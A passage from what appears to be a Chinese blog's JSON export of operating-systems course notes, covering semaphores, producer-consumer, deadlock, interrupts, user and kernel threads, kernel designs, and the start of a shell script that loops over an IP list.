我们先考虑实现一个基础的版本，用一个整数变量lock来记录进入临界区线程的数量。 1234567int lock = 0;enter()&#123; while(lock++ &gt; 2) &#123; &#125;&#125;leave()&#123; lock--;&#125; 上面的代码具有一定的欺骗性，没有考虑到竞争条件，执行的时候会出问题，可能会有超过2个线程同时进入临界区。 下面优化一下，作为一个考虑了竞争条件的版本： 123456up(&amp;lock)&#123; while(!cas(&amp;lock, lock, lock+1)) &#123; &#125;&#125;down(&amp;lock)&#123; while(!cas(&amp;lock, lock, lock - 1) || lock == 0)&#123;&#125;&#125; 为了简化模型，我们重新设计了两个原子操作up和down。up将lock增 1，down将lock减 1。当 lock 为 0 时，如果还在down那么会自旋。考虑用多个线程同时执行下面这段程序： 1234int lock = 2;down(&amp;lock);// 临界区up(&amp;lock); 如果只有一个线程在临界区，那么lock等于 1，第 2 个线程还可以进入。 如果两个线程在临界区，第 3 个线程尝试down的时候，会陷入自旋锁。当然我们也可以用其他方式来替代自旋锁，比如让线程休眠。 当lock初始值为 1 的时候，这个模型就是实现互斥（mutex）。如果 lock 大于 1，那么就是同时允许多个线程进入临界区。这种方法，我们称为信号量（semaphore）。 信号量实现生产者消费者模型信号量可以用来实现生产者消费者模型。下面我们通过一段代码实现生产者消费者： 1234567891011121314151617181920212223242526int empty = N; // 当前空位置数量int mutex = 1; // 锁int full = 0; // 当前的等待的线程数wait()&#123; down(&amp;empty); down(&amp;mutex); insert(); up(&amp;mutex); up(&amp;full);&#125;notify()&#123; down(&amp;full); down(&amp;mutex); remove(); up(&amp;mutex); up(&amp;empty)&#125;insert()&#123; wait_queue.add(currentThread); yield();&#125;remove()&#123; thread = wait_queue.dequeue(); thread.resume();&#125; 代码中 wait 是生产者，notify 是消费者。 每次wait操作减少一个空位置数量，empty-1；增加一个等待的线程，full+1。每次notify操作增加一个空位置，empty+1，减少一个等待线程，full-1。 insert和remove方法是互斥的操作，需要用另一个 mutex 锁来保证。insert方法将当前线程加入等待队列，并且调用 yield 方法，交出当前线程的控制权，当前线程休眠。remove方法从等待队列中取出一个线程，并且调用resume进行恢复。以上， 就构成了一个简单的生产者消费者模型。 死锁问题另外就是在并行的时候，如果两个线程互相等待对方获得的锁，就会发生死锁。你可以把死锁理解成一个环状的依赖关系。比如： 1234567891011121314int lock1 = 0;int lock2 = 0;// 线程1enter(&amp;lock1);enter(&amp;lock2);leave(&amp;lock1);leave(&amp;lock2);// 线程2enter(&amp;lock2);enter(&amp;lock1);leave(&amp;lock1);leave(&amp;lock2) 上面的程序，如果是按照下面这个顺序执行，就会死锁： 12345线程1： enter(&amp;lock1);线程2： enter(&amp;lock2);线程1： enter(&amp;lock2)线程2: enter(&amp;lock1)// 死锁发生，线程1、2陷入等待 上面程序线程 1 获得了lock1，线程 2 获得了lock2。接下来线程 1 尝试获得lock2，线程 2 尝试获得lock1，于是两个线程都陷入了等待。这个等待永远都不会结束，我们称之为死锁。 分布式环境的锁最后，我们留一点时间给分布式锁。我们之前讨论了非常多的实现，是基于多个线程访问临界区。现在要考虑一个更庞大的模型，我们有 100 个容器，每一个里面有一个为用户减少积分的服务。 简化下模型，假设积分存在 Redis 中。当然数据库中也有，但是我们只考虑 Redis。使用 Redis，我们目标是给数据库减负。 假设这个接口可以看作 3 个原子操作： 从 Redis 读出当前库存； 计算库存 -1； 更新 Redis 库存。 和i++类似，很明显，当用户并发的访问这个接口，是会发生竞争条件的。 因为程序已经不是在同一台机器上执行了，解决方案就是分布式锁。实现锁，我们需要原子操作。 在单机多线程并发的场景下，原子操作由 CPU 指令提供，比如 cas 和 tas 指令。那么在分布式环境下，原子操作由谁提供呢？ 有很多工具都可以提供分布式的原子操作，比如 Redis 的 setnx 指令，Zookeeper 的节点操作等等。作为操作系统课程，这部分我不再做进一步的讲解。这里是从多线程的处理方式，引出分布式的处理方式，通过两个类比，帮助你提高。如果你感兴趣，可以自己查阅更多的分布式锁的资料。 总结那么通过这节课的学习，你现在可以尝试来回答本讲关联的面试题目：如何控制同一时间只有 2 个线程运行？ 老规矩，请你先在脑海里构思下给面试官的表述，并把你的思考写在留言区，然后再来看我接下来的分析。 【解析】 同时控制两个线程进入临界区，一种方式可以考虑用信号量（semaphore）。 另一种方式是考虑生产者、消费者模型。想要进入临界区的线程先在一个等待队列中等待，然后由消费者每次消费两个。这种实现方式，类似于实现一个线程池，所以也可以考虑实现一个 ThreadPool 类，然后再实现一个调度器类，最后实现一个每次选择两个线程执行的调度算法。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"中断和中断向量","slug":"计操/中断和中断向量","date":"2021-07-19T16:31:52.000Z","updated":"2021-07-22T03:39:20.997Z","comments":true,"path":"2021/07/20/计操/中断和中断向量/","link":"","permalink":"https://www.shanghua.live/2021/07/20/%E8%AE%A1%E6%93%8D/%E4%B8%AD%E6%96%AD%E5%92%8C%E4%B8%AD%E6%96%AD%E5%90%91%E9%87%8F/","excerpt":"","text":"请你思考：Java/JS 等语言为什么可以捕获到键盘的输入？ 探索过程：如何设计响应键盘的整个链路？当你拿到一个问题时，需要冷静下来思考和探索解决方案。你可以查资料、看视频或者咨询专家，但是在这之前，你先要进行一定的思考和梳理，有的问题可以直接找到答案，有的问题却需要继续深挖寻找其背后的理论支撑。 问题 1：我们的目标是什么?我们的目标是在 Java/JS 中实现按键响应程序。这种实现有点像 Switch-Case 语句——根据不同的按键执行不同的程序，比如按下回车键可以换行，按下左右键可以移动光标。 问题 2：按键怎么抽象？键盘上一般不超过 100 个键。因此我们可以考虑用一个 Byte 的数据来描述用户按下了什么键。按键有两个操作，一个是按下、一个是释放，这是两个不同的操作。对于一个 8 位的字节，可以考虑用最高位的 1 来描述按下还是释放的状态，然后后面的 7 位（0~127）描述具体按了哪个键。这样我们只要确定了用户按键/释放的顺序，对我们的系统来说，就不会有歧义。 问题 3：如何处理按键？使用操作系统处理还是让每个程序自己实现？处理按键是一个通用程序，可以考虑由操作系统先进行一部分处理，比如： 用户按下了回车键，先由操作系统进行统一的封装，再把按键的编码转换为字符串 Enter 方便各种程序使用。 处理组合键这种操作，由操作系统先一步进行计算比较好。因为底层只知道按键、释放，组合键必须结合时间因素判断。 你可以把下面这种情况看作是一个 Ctrl + C 组合键，这种行为可以由操作系统进行统一处理，如下所示： 1234按下 Ctrl按下 C释放 Ctrl释放 C 问题 4：程序用什么模型响应按键？当一个 Java 或者 JS 写的应用程序想要响应按键时，应该考虑消息模型。因为如果程序不停地扫描按键，会给整个系统带来很大的负担。比如程序写一个 while 循环去扫描有没有按键，开销会很大。 如果程序在操作系统端注册一个响应按键的函数，每次只有真的触发按键时才执行这个函数，这样就能减少开销了。 问题 5：处理用户按键，需不需要打断正在执行的程序？从用户体验上讲，按键应该是一个高优先级的操作，比如用户按 Ctrl+C 或者 Esc 的时候，可能是因为用户想要打断当前执行的程序。即便是用户只想要输入，也应该尽可能地集中资源给到用户，因为我们不希望用户感觉到延迟。 如果需要考虑到程序随时会被中断，去响应其他更高优先级的情况，那么从程序执行的底层就应该支持这个行为，而且最好从硬件层面去支持，这样速度最快。 这就引出了本课时的主角——中断。具体如何处理，见下面我们关于中断部分的分析。 问题 6：操作系统如何知道用户按了哪个键？这里有一个和问题 5 类似的问题。操作系统是不断主动触发读取键盘按键，还是每次键盘按键到来的时候都触发一段属于操作系统的程序呢？ 显然，后者更节省效率。 那么谁能随时随地中断操作系统的程序？ 谁有这个权限？是管理员账号吗？ 当然不是，拥有这么高权限的应该是机器本身。 我们思考下这个模型，用户每次按键，触发一个 CPU 的能力，这个能力会中断正在执行的程序，去处理按键。那 CPU 内部是不是应该有处理按键的程序呢？这肯定不行，因为我们希望 CPU 就是用来做计算的，如果 CPU 内部有自带的程序，会把问题复杂化。这在软件设计中，叫作耦合。CPU 的工作就是专注高效的执行指令。 因此，每次按键，必须有一个机制通知 CPU。我们可以考虑用总线去通知 CPU，也就是主板在通知 CPU。 flowchart LR A[键盘] --- B[主板] B --- D[CPU] 那么 CPU 接收到通知后，如何通知操作系统呢？CPU 只能中断正在执行的程序，然后切换到另一个需要执行的程序。说白了就是改变 PC 指针，CPU 只有这一种办法切换执行的程序。这里请你思考，是不是只有这一种方法：CPU 中断当前执行的程序，然后去执行另一个程序，才能改变 PC 指针？ flowchart LR A[PC] --改变 PC 指针--&gt; B[按键响应程序] A -.-&gt; C[当前程序] 接下来我们进一步思考，CPU 怎么知道 PC 指针应该设置为多少呢？是不是 CPU 知道操作系统响应按键的程序位置呢？ 答案当然是不知道。 因此，我们只能控制 CPU 跳转到一个固定的位置。比如说 CPU 一收到主板的信息（某个按键被触发），CPU 就马上中断当前执行的程序，将 PC 指针设置为 0。也就是 PC 指针下一步会从内存地址 0 中读取下一条指令。当然这只是我们的一个思路，具体还需要进一步考虑。而操作系统要做的就是在这之前往内存地址 0 中写一条指令，比如说让 PC 指针跳转到自己处理按键程序的位置。 讲到这里，我们总结一下，CPU 要做的就是一看到中断，就改变 PC 指针（相当于中断正在执行的程序），而 PC 改变成多少，可以根据不同的类型来判断，比如按键就到 0。操作系统就要向这些具体的位置写入指令，当中断发生时，接管程序的控制权，也就是让 PC 指针指向操作系统处理按键的程序。 上面这个模型和实际情况还有出入，但是我们已经开始逐渐完善了。 问题 7：主板如何知道键盘被按下?经过一层一层地深挖“如何设计响应键盘的整个链路？”这个问题，目前操作系统已经能接管按键，接下来，我们还需要思考主板如何知道有按键，并且通知 CPU。 你可以把键盘按键看作按下了某个开关，我们需要一个芯片将按键信息转换成具体按键的值。比如用户按下 A 键，A 键在第几行、第几列，可以看作一个电学信号。接着我们需要芯片把这个电学信号转化为具体的一个数字（一个 Byte）。转化完成后，主板就可以接收到这个数字（按键码），然后将数字写入自己的一个寄存器中，并通知 CPU。 为了方便 CPU 计算，CPU 接收到主板通知后，按键码会被存到一个寄存器里，这样方便处理按键的程序执行。 通过对以上 7 个问题的思考和分析，我们已经有了一个粗浅的设计，接下来就要开始整理思路了。 思路的整理：中断的设计整体设计分成了 3 层，第一层是硬件设计、第二层是操作系统设计、第三层是程序语言的设计。 flowchart TD A[硬件] B[kernel] C[应用] 按键码的收集，是键盘芯片和主板的能力。主板知道有新的按键后，通知 CPU，CPU 要中断当前执行的程序，将 PC 指针跳转到一个固定的位置，我们称为一次中断（interrupt）。 考虑到系统中会出现各种各样的事件，我们需要根据中断类型来判断PC 指针跳转的位置，中断类型不同，PC 指针跳转的位置也可能会不同。比如按键程序、打印机就绪程序、系统异常等都需要中断，包括在“14 课时”我们学习的系统调用，也需要中断正在执行的程序，切换到内核态执行内核程序。 因此我们需要把不同的中断类型进行分类，这个类型叫作中断识别码。比如按键，我们可以考虑用编号 16，数字 16 就是按键中断类型的识别码。不同类型的中断发生时，CPU 需要知道 PC 指针该跳转到哪个地址，这个地址，称为中断向量（Interupt Vector）。 你可以考虑这样的实现：当编号 16 的中断发生时，32 位机器的 PC 指针直接跳转到内存地址 16*4 的内存位置。如果设计最多有 255 个中断，编号就是从 0~255，刚好需要 1K 的内存地址存储中断向量——这个 1K 的空间，称为中断向量表。 因此 CPU 接收到中断后，CPU 根据中断类型操作 PC 指针，找到中断向量。操作系统必须在这之前，修改中断向量，插入一条指令。比如操作系统在这里写一条Jump指令，将 PC 指针再次跳转到自己处理对应中断类型的程序。 flowchart LR A[正在执行的程序] -.中断 CPU 硬件实现..-&gt; B[中断向量] B -.操作系统注册跳转指令..-&gt; C[对应中断的处理程序 操作系统] 操作系统接管之后，以按键程序为例，操作系统会进行一些处理，包括下面的几件事情：Win/Mac/Unix/Linux 将按键放入一个队列，保存下来。这是因为，操作系统不能保证及时处理所有的按键，比如当按键过快时，需要先存储下来，再分时慢慢处理。 计算组合键。可以利用按下、释放之间的时间关系。 经过一定计算将按键抽象成消息（事件结构或对象）。 提供 API 给应用程序，让应用程序可以监听操作系统处理后的消息。 分发按键消息给监听按键的程序。 所以程序在语言层面，比如像 Java/Node.js 这种拥有虚拟机的语言，只需要对接操作系统 API 就可以了。 中断的类型接下来我们一起讨论下中断的分类方法： 按照中断的触发方分成同步中断和异步中断； 根据中断是否强制触发分成可屏蔽中断和不可屏蔽中断。 中断可以由 CPU 指令直接触发，这种主动触发的中断，叫作同步中断。同步中断有几种情况。 之前我们学习的系统调用，需要从用户态切换内核态，这种情况需要程序触发一个中断，叫作陷阱（Trap），中断触发后需要继续执行系统调用。 还有一种同步中断情况是错误（Fault），通常是因为检测到某种错误，需要触发一个中断，中断响应结束后，会重新执行触发错误的地方，比如后面我们要学习的缺页中断。 最后还有一种情况是程序的异常，这种情况和 Trap 类似，用于实现程序抛出的异常。 另一部分中断不是由 CPU 直接触发，是因为需要响应外部的通知，比如响应键盘、鼠标等设备而触发的中断。这种中断我们称为异步中断。 CPU 通常都支持设置一个中断屏蔽位（一个寄存器），设置为 1 之后 CPU 暂时就不再响应中断。对于键盘鼠标输入，比如陷阱、错误、异常等情况，会被临时屏蔽。但是对于一些特别重要的中断，比如 CPU 故障导致的掉电中断，还是会正常触发。可以被屏蔽的中断我们称为可屏蔽中断，多数中断都是可屏蔽中断。 所以这里我们讲了两种分类方法，一种是同步中断和异步中断。另一种是可屏蔽中断和不可屏蔽中断。 总结这节课我们通过探索式学习讨论了中断的设计。 通过一个问题，Java/JS 如何响应键盘按键，引出了 7 个问题的思考。通过探索这些问题，我们最终找到 了答案，完成了一次从硬件、内核到应用的完整设计。 为了捕获到键盘输入，硬件层面需要把按键抽象成中断，中断 CPU 执行。CPU 根据中断类型找到对应的中断向量。操作系统预置了中断向量，因此发生中断后操作系统接管了程序。操作系统实现了基本解析按键的算法，将按键抽象成键盘事件，并且提供了队列存储多个按键，还提供了监听按键的 API。因此应用程序，比如 Java/Node.js 虚拟机，就可以通过调用操作系统的 API 使用键盘事件。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"用户态线程和内核态线程","slug":"计操/用户态线程和内核态线程","date":"2021-07-19T16:02:26.000Z","updated":"2021-07-19T08:31:24.277Z","comments":true,"path":"2021/07/20/计操/用户态线程和内核态线程/","link":"","permalink":"https://www.shanghua.live/2021/07/20/%E8%AE%A1%E6%93%8D/%E7%94%A8%E6%88%B7%E6%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%86%85%E6%A0%B8%E6%80%81%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"用户态线程和内核态线程 用户态和内核态是什么？ 用户级线程和内核级线程是一个怎样的对应关系？ 内核响应系统调用是一个怎样的过程？ 什么是用户态和内核态Kernel 运行在超级权限模式（Supervisor Mode）下，所以拥有很高的权限。按照权限管理的原则，多数应用程序应该运行在最小权限下。因此，很多操作系统，将内存分成了两个区域： 内核空间（Kernal Space），这个空间只有内核程序可以访问； 用户空间（User Space），这部分内存专门给应用程序使用。 用户态和内核态用户空间中的代码被限制了只能使用一个局部的内存空间，我们说这些程序在用户态（User Mode） 执行。内核空间中的代码可以访问所有内存，我们称这些程序在内核态（Kernal Mode） 执行。 系统调用过程如果用户态程序需要执行系统调用，就需要切换到内核态执行。 如上图所示：内核程序执行在内核态（Kernal Mode），用户程序执行在用户态（User Mode）。当发生系统调用时，用户态的程序发起系统调用。因为系统调用中牵扯特权指令，用户态程序权限不足，因此会中断执行，也就是 Trap（Trap 是一种中断）。 发生中断后，当前 CPU 执行的程序会中断，跳转到中断处理程序。内核程序开始执行，也就是开始处理系统调用。内核处理完成后，主动触发 Trap，这样会再次发生中断，切换回用户态工作。 线程模型上面我们学习了用户态和内核态，接下来我们从进程和线程的角度进一步思考本课时开头抛出的问题。 进程和线程一个应用程序启动后会在内存中创建一个执行副本，这就是进程。Linux 的内核是一个 Monolithic Kernel（宏内核），因此可以看作一个进程。也就是开机的时候，磁盘的内核镜像被导入内存作为一个执行副本，成为内核进程。 进程可以分成用户态进程和内核态进程两类。用户态进程通常是应用程序的副本，内核态进程就是内核本身的进程。如果用户态进程需要申请资源，比如内存，可以通过系统调用向内核申请。 那么用户态进程如果要执行程序，是否也要向内核申请呢？ 程序在现代操作系统中并不是以进程为单位在执行，而是以一种轻量级进程（Light Weighted Process），也称作线程（Thread）的形式执行。 一个进程可以拥有多个线程。进程创建的时候，一般会有一个主线程随着进程创建而创建。 如果进程想要创造更多的线程，就需要思考一件事情，这个线程创建在用户态还是内核态。 你可能会问，难道不是用户态的进程创建用户态的线程，内核态的进程创建内核态的线程吗？ 其实不是，进程可以通过 API 创建用户态的线程，也可以通过系统调用创建内核态的线程，接下来我们说说用户态的线程和内核态的线程。 用户态线程用户态线程也称作用户级线程（User Level Thread）。操作系统内核并不知道它的存在，它完全是在用户空间中创建。 用户级线程有很多优势，比如。 管理开销小：创建、销毁不需要系统调用。 切换成本低：用户空间程序可以自己维护，不需要走操作系统调度。但是这种线程也有很多的缺点。 与内核协作成本高：比如这种线程完全是用户空间程序在管理，当它进行 I/O 的时候，无法利用到内核的优势，需要频繁进行用户态到内核态的切换。 线程间协作成本高：设想两个线程需要通信，通信需要 I/O，I/O 需要系统调用，因此用户态线程需要支付额外的系统调用成本。 无法利用多核优势：比如操作系统调度的仍然是这个线程所属的进程，所以无论每次一个进程有多少用户态的线程，都只能并发执行一个线程，因此一个进程的多个线程无法利用多核的优势。 操作系统无法针对线程调度进行优化：当一个进程的一个用户态线程阻塞（Block）了，操作系统无法及时发现和处理阻塞问题，它不会更换执行其他线程，从而造成资源浪费。 内核态线程内核态线程也称作内核级线程（Kernel Level Thread）。这种线程执行在内核态，可以通过系统调用创造一个内核级线程。 内核级线程有很多优势。 可以利用多核 CPU 优势：内核拥有较高权限，因此可以在多个 CPU 核心上执行内核线程。 操作系统级优化：内核中的线程操作 I/O 不需要进行系统调用；一个内核线程阻塞了，可以立即让另一个执行。 当然内核线程也有一些缺点。 创建成本高：创建的时候需要系统调用，也就是切换到内核态。 扩展性差：由一个内核程序管理，不可能数量太多。 切换成本较高：切换的时候，也同样存在需要内核操作，需要切换内核态。 用户态线程和内核态线程之间的映射关系线程简单理解，就是要执行一段程序。程序不会自发的执行，需要操作系统进行调度。我们思考这样一个问题，如果有一个用户态的进程，它下面有多个线程。如果这个进程想要执行下面的某一个线程，应该如何做呢？ 这时，比较常见的一种方式，就是将需要执行的程序，让一个内核线程去执行。毕竟，内核线程是真正的线程。因为它会分配到 CPU 的执行资源。 如果一个进程所有的线程都要自己调度，相当于在进程的主线程中实现分时算法调度每一个线程，也就是所有线程都用操作系统分配给主线程的时间片段执行。这种做法，相当于操作系统调度进程的主线程；进程的主线程进行二级调度，调度自己内部的线程。 这样操作劣势非常明显，比如无法利用多核优势，每个线程调度分配到的时间较少，而且这种线程在阻塞场景下会直接交出整个进程的执行权限。 由此可见，用户态线程创建成本低，问题明显，不可以利用多核。内核态线程，创建成本高，可以利用多核，切换速度慢。因此通常我们会在内核中预先创建一些线程，并反复利用这些线程。这样，用户态线程和内核态线程之间就构成了下面 4 种可能的关系： 多对一（Many to One）用户态进程中的多线程复用一个内核态线程。这样，极大地减少了创建内核态线程的成本，但是线程不可以并发。因此，这种模型现在基本上用的很少。我再多说一句，这里你可能会有疑问，比如：用户态线程怎么用内核态线程执行程序？ 程序是存储在内存中的指令，用户态线程是可以准备好程序让内核态线程执行的。后面的几种方式也是利用这样的方法。 一对一（One to One）该模型为每个用户态的线程分配一个单独的内核态线程，在这种情况下，每个用户态都需要通过系统调用创建一个绑定的内核线程，并附加在上面执行。 这种模型允许所有线程并发执行，能够充分利用多核优势，Windows NT 内核采取的就是这种模型。但是因为线程较多，对内核调度的压力会明显增加。 多对多（Many To Many）这种模式下会为 n 个用户态线程分配 m 个内核态线程。m 通常可以小于 n。一种可行的策略是将 m 设置为核数。这种多对多的关系，减少了内核线程，同时也保证了多核心并发。Linux 目前采用的就是该模型。 两层设计（Two Level）这种模型混合了多对多和一对一的特点。多数用户态线程和内核线程是 n 对 m 的关系，少量用户线程可以指定成 1 对 1 的关系。 上图所展现的是一个非常经典的设计。 总结用户态线程工作在用户空间，内核态线程工作在内核空间。用户态线程调度完全由进程负责，通常就是由进程的主线程负责。相当于进程主线程的延展，使用的是操作系统分配给进程主线程的时间片段。内核线程由内核维护，由操作系统调度。 用户态线程无法跨核心，一个进程的多个用户态线程不能并发，阻塞一个用户态线程会导致进程的主线程阻塞，直接交出执行权限。这些都是用户态线程的劣势。内核线程可以独立执行，操作系统会分配时间片段。因此内核态线程更完整，也称作轻量级进程。内核态线程创建成本高，切换成本高，创建太多还会给调度算法增加压力，因此不会太多。 实际操作中，往往结合两者优势，将用户态线程附着在内核态线程中执行。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"操作系统内核","slug":"计操/操作系统内核","date":"2021-07-19T11:52:46.000Z","updated":"2021-07-19T08:41:31.791Z","comments":true,"path":"2021/07/19/计操/操作系统内核/","link":"","permalink":"https://www.shanghua.live/2021/07/19/%E8%AE%A1%E6%93%8D/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8/","excerpt":"","text":"什么是内核？说到操作系统，就必须说内核。内核是操作系统中应用连接硬件设备的桥梁。 内核的能力对于一个现代的操作系统来说，它的内核至少应该提供以下 4 种基本能力： 管理进程、线程（决定哪个进程、线程使用 CPU）； 管理内存（决定内存用来做什么）； 连接硬件设备（为进程、和设备间提供通信能力）； 提供系统调用（接收进程发送来的系统调用）。 操作系统分层从上面 4 种能力来看操作系统和内核之间的关系，通常可以把操作系统分成 3 层，最底层的硬件设备抽象、中间的内核和最上层的应用。 flowchart TD A[Applications] &lt;--&gt; B[Kernel] B &lt;--&gt; D[CPU] B &lt;--&gt; E[Memory] B &lt;--&gt; F[Devices] 内核是如何工作的？为了帮助你理解什么是内核，请你先思考一个问题：进程和内核的关系，是不是像浏览器请求服务端服务？ 接下来，我们先一起分析一下这个问题。 内核权限非常高，它可以管理进程、可以直接访问所有的内存，因此确实需要和进程之间有一定的隔离。这个隔离用类似请求/响应的模型，非常符合常理。 flowchart LR A[进程] --- B[请求] B --&gt; D[内核] G[请求] --- F[响应] F --&gt; E[内核] 但不同的是在浏览器、服务端模型中，浏览器和服务端是用不同的机器在执行，因此不需要共享一个 CPU。但是在进程调用内核的过程中，这里是存在资源共享的。 比如，一个机器有 4 个 CPU，不可能让内核用一个 CPU，其他进程用剩下的 CPU。这样太浪费资源了。 再比如，进程向内核请求 100M 的内存，内核把 100M 的数据传回去。 这个模型不可行，因为传输太慢了。 所以，这里多数操作系统的设计都遵循一个原则：进程向内核发起一个请求，然后将 CPU 执行权限让出给内核。内核接手 CPU 执行权限，然后完成请求，再转让出 CPU 执行权限给调用进程。 Linux 的设计Linux 操作系统第一版是 1991 年林纳斯托·瓦兹（一个芬兰的小伙子，当时 22 岁）用 C 语音写的。 写完之后他在网络上发布了 Linux 内核的源代码。又经过了 3 年的努力，在 1994 年发布了完整的核心 Version 1.0。 说到 Linux 内核设计，这里有很多有意思的名词。大多数听起来复杂、专业，但是理解起来其实很简单。接下来我们一一讨论。 Multitask and SMP（Symmetric multiprocessing） MultiTask 指多任务，Linux 是一个多任务的操作系统。多任务就是多个任务可以同时执行，这里的“同时”并不是要求并发，而是在一段时间内可以执行多个任务。当然 Linux 支持并发。 SMP 指对称多处理。其实是说 Linux 下每个处理器的地位是相等的，内存对多个处理器来说是共享的，每个处理器都可以访问完整的内存和硬件资源。 这个特点决定了在 Linux 上不会存在一个特定的处理器处理用户程序或者内核程序，它们可以被分配到任何一个处理器上执行。 ELF（Executable and Linkable Format） 这个名词翻译过来叫作可执行文件链接格式。这是一种从 Unix 继承而来的可执行文件的存储格式。我们可以看到 ELF 中把文件分成了一个个分段（Segment），每个段都有自己的作用。 Monolithic Kernel 这个名词翻译过来就是宏内核，宏内核反义词就是 Microkernel ，微内核的意思。Linux 是宏内核架构，这说明 Linux 的内核是一个完整的可执行程序，且内核用最高权限来运行。宏内核的特点就是有很多程序会打包在内核中，比如，文件系统、驱动、内存管理等。当然这并不是说，每次安装驱动都需要重新编译内核，现在 Linux 也可以动态加载内核模块。所以哪些模块在内核层，哪些模块在用户层，这是一种系统层的拆分，并不是很强的物理隔离。 与宏内核对应，接下来说说微内核，内核只保留最基本的能力。比如进程调度、虚拟内存、中断。多数应用，甚至包括驱动程序、文件系统，是在用户空间管理的。 感觉分层其实差不多。 我这里说一个很大的区别，比如说驱动程序是需要频繁调用底层能力的，如果在内核中，性能肯定会好很多。对于微内核设计，驱动在内核外，驱动和硬件设备交互就需要频繁做内核态的切换。 当然微内核也有它的好处，比如说微内核体积更小、可移植性更强。不过我认为，随着计算能力、存储技术越来越发达，体积小、安装快已经不能算是一个很大的优势了。现在更重要的是如何有效利用硬件设备的性能。 之所以这么思考，也可能因为我是带着现代的目光回望当时人们对内核的评判，事实上，当时 Linux 团队也因此争论过很长一段时间。 但是我觉得历史往往是螺旋上升的，说不定将来性能发展到了一个新的阶段，像微内核的灵活性、可以提供强大的抽象能力这样的特点，又重新受到人们的重视。 还有一种就是混合类型内核。 混合类型的特点就是架构像微内核，内核中会有一个最小版本的内核，其他功能会在这个能力上搭建。但是实现的时候，是用宏内核的方式实现的，就是内核被做成了一个完整的程序，大部分功能都包含在内核中。就是在宏内核之内有抽象出了一个微内核。 上面我们大体介绍了内核几个重要的特性，有关进程、内存、虚拟化等特性。 Window 设计接下来我们说说 Windows 的设计，Windows 和 Linux 的设计有很大程度的相似性。Windows 也有内核，它的内核是 C/C++ 写的。准确地说，Windows 有两个内核版本。一个是早期的 Windows 9x 内核，早期的 Win95, Win98 都是这个内核。我们今天用的 Windows 7, Windows 10 是另一个内核，叫作 Windows NT。NT 指的是 New Technology。接下来我们讨论的都是 NT 版本的内核。 下面我找到一张 Windows 内核架构的图片给你一个直观感受。 Windows 同样支持 Multitask 和 SMP（对称多处理）。Windows 的内核设计属于混合类型。你可以看到内核中有一个 Microkernel 模块。而整个内核实现又像宏内核一样，含有的能力非常多，是一个完整的整体。 Windows 下也有自己的可执行文件格式，这个格式叫作 Portable Executable（PE），也就是可移植执行文件，扩展名通常是.exe、.dll、.sys 等。 PE 文件的结构和 ELF 结构有很多相通的地方，我找到了一张图片帮助你更直观地理解。 因为这部分知识涉及编译原理，我这里就不详细介绍了，感兴趣同学可以在留言区和大家一起讨论，或者查阅更多资料。 Windows 还有很多独特的能力，比如 Hyper-V 虚拟化技术 总结从整体设计上来看，Linux 是宏内核，NT 内核属于混合型内核。和微内核不同，宏内核和混合类型内核从实现上来看是一个完整的程序。只不过混合类型内核内部也抽象出了微内核的概念，从内核内部看混合型内核的架构更像微内核。 另外 NT 内核和 Linux 内核还存在着许多其他的差异，比如： Linux 内核是一个开源的内核； 它们支持的可执行文件格式不同； 它们用到的虚拟化技术不同。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"高级技巧之集群部署","slug":"计操/集群部署","date":"2021-07-18T14:42:38.000Z","updated":"2021-07-18T07:28:54.047Z","comments":true,"path":"2021/07/18/计操/集群部署/","link":"","permalink":"https://www.shanghua.live/2021/07/18/%E8%AE%A1%E6%93%8D/%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/","excerpt":"","text":"Linux 指令是由很多顶级程序员共同设计的，使用 Linux 指令解决问题的过程，就好像在体验一款优秀的产品。每次通过查资料使用 Linux 指令解决问题后，都会让我感到收获满满。在这个过程中，我不仅学会了一条指令，还从中体会到了软件设计的魅力：彼此独立，又互成一体。这就像每个 Linux 指令一样，专注、高效。回想起来，在我第一次看到管道、第一次使用 awk、第一次使用 sort，都曾有过这种感受。 第一步：搭建学习用的集群第一步我们先搭建一个学习用的集群。这里简化一下模型。我在自己的电脑上装一个 ubuntu 桌面版的虚拟机，然后再装两个 ubuntu 服务器版的虚拟机。 相对于桌面版，服务器版对资源的消耗会少很多。我将教学材料中桌面版的 ubuntu 命名为 u1，两个用来被管理的服务器版 ubuntu 叫作 v1 和 v2。 用桌面版的原因是：我喜欢 ubuntu 漂亮的开源字体，这样会让我在给你准备素材的时候拥有一个好心情。如果你对此感兴趣，可以搜索 ubuntu mono，尝试把这个字体安装到自己的文本编辑器中。不过我还是觉得在 ubuntu 中敲代码更有感觉。 注意，我在这里只用了 3 台服务器，但是接下来我们要写的脚本是可以在很多台服务器之间复用的。 第二步：循环遍历 IP 列表你可以想象一个局域网中有很多服务器需要管理，它们彼此之间网络互通，我们通过一台主服务器对它们进行操作，即通过 u1 操作 v1 和 v2。 目前 iplist 中只有两项，但是如果我们有足够的机器，可以在里面放成百上千项。接下来，请你思考 shell 如何遍历这些 ip？ 你可以先尝试实现一个最简单的程序，从文件 iplist 中读出这些 ip 并尝试用 for 循环遍历这些 ip，具体程序如下： 目前 iplist 中只有两项，但是如果我们有足够的机器，可以在里面放成百上千项。接下来，请你思考 shell 如何遍历这些 ip？ 你可以先尝试实现一个最简单的程序，从文件 iplist 中读出这些 ip 并尝试用 for 循环遍历这些 ip，具体程序如下： 123456#!/usr/bin/bashreadarray -t ips &lt; iplistfor ip in $&#123;ips[@]&#125;do echo $ipdone 首行的#!叫作 Shebang。Linux 的程序加载器会分析 Shebang 的内容，决定执行脚本的程序。这里我们希望用 bash 来执行这段程序，因为我们用到的 readarray 指令是 bash 4.0 后才增加的能力。 readarray 指令将 iplist 文件中的每一行读取到变量 ips 中。ips 是一个数组，可以用 echo ${ips[@]}打印其中全部的内容：@代表取数组中的全部内容；$符号是一个求值符号。不带$的话，ips[@]会被认为是一个字符串，而不是表达式。 for 循环遍历数组中的每个 ip 地址，echo 